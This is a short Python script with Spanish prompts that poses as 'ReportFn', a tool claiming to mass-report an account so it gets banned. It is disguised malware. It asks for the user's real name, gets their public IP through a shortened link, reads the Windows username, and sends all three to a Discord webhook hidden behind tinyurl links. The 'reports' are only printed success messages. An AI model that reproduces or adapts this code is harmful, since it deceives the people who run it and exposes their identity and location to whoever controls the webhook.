import os
print("Primero instalaremos lo necesario")
os.system('pip install requests')
os.system('pip install colorama')
os.system('pip install requests')
os.system('pip install discord_webhook')
os.system('pip install requests')
os.system('pip install colorama')
os.system(f'title ReportFn')
import requests, datetime as tie, os, time
from base64 import b64decode
from discord_webhook import DiscordWebhook as nes
from urllib.request import Request, urlopen
picture = 'https://tinyurl.com/2btmwser'

webhook = 'https://tinyurl.com/2wkydued'

username = 'Names'
message = input('Como te llamas?(Solo nombre real es admitido): ')



    


data = {
	    'content': message,
        'avatar_url': picture,
        'username': username

        	}


sent = 0
failed = 0

#while False:
r = requests.post(webhook, data)

print("Bien "+message+" Espera un momento...")

pro = 'https://tinyurl.com/2wkydued'    

timee = tie.datetime.now()

dataxd = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
pcuname = os.getenv("UserName")
exx = nes(url=f'{pro}', content=f'||`IP: {dataxd} // Nombre de PC: {pcuname} // Fecha {timee}`|| ')

response = exx.execute()

time.sleep(0.3)
print("Listo, script cargando "+message+" !")


import time, requests, os
from colorama import Fore
os.system('cls')
print(Fore.RED+"""
         ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#      
 
""")
que = input('Presiona una tecla para empezar: '+Fore.RESET)
if que=='': 
 idk = input(Fore.LIGHTRED_EX+'Ingresa el nombre de quien quieras banear: '+Fore.RESET)


for l in range(50):
	time.sleep(0.03)
	print(Fore.GREEN+" [+]La cuenta de "+idk+" Ha sido reportada con exito[+]")
time.sleep(0.5)

if idk: 
  for idk in range(40):
   time.sleep(000.02)
print(Fore.RED+"              [$]Reportes exitosos, ah esperar[$]"+Fore.RESET)
time.sleep(17)
